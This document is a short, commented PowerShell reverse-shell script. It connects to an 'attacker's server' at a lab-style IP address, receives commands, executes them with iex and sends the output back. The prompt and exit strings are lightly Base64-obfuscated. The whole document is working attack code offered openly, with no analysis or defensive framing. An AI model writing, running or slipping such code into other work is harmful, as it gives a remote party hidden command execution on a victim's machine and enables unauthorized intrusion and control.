# Create a TCP client to connect to the attacker's server
$server = New-Object System.Net.Sockets.TcpClient('192.168.56.50', 8080)
if ($server -eq $null) { exit 1 }

# Get the network stream for communication
$stream = $server.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object Byte[] 1024
$encoding = New-Object System.Text.AsciiEncoding

do {
    # Send the "PS> " prompt
    $writer.Write($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAD4AIAA='))))  # "PS> "
    $writer.Flush()

    # Wait for a command from the server
    $read = $null
    while ($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null) { }

    # Decode and execute the command
    $data = $encoding.GetString($buffer, 0, $read)
    $output = iex $data 2>&1 | Out-String

    # Prepare response with current working directory
    $prompt = $output + (Get-Location).Path + '> '
    $sendBytes = $encoding.GetBytes($prompt)

    # Send response back to server
    $writer.Write($sendBytes, 0, $sendBytes.Length)
    $writer.Flush()
}
while ($data -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AGkAdAA='))))  # "exit"

# Close the stream and TCP connection
$writer.Close()
$server.Close()
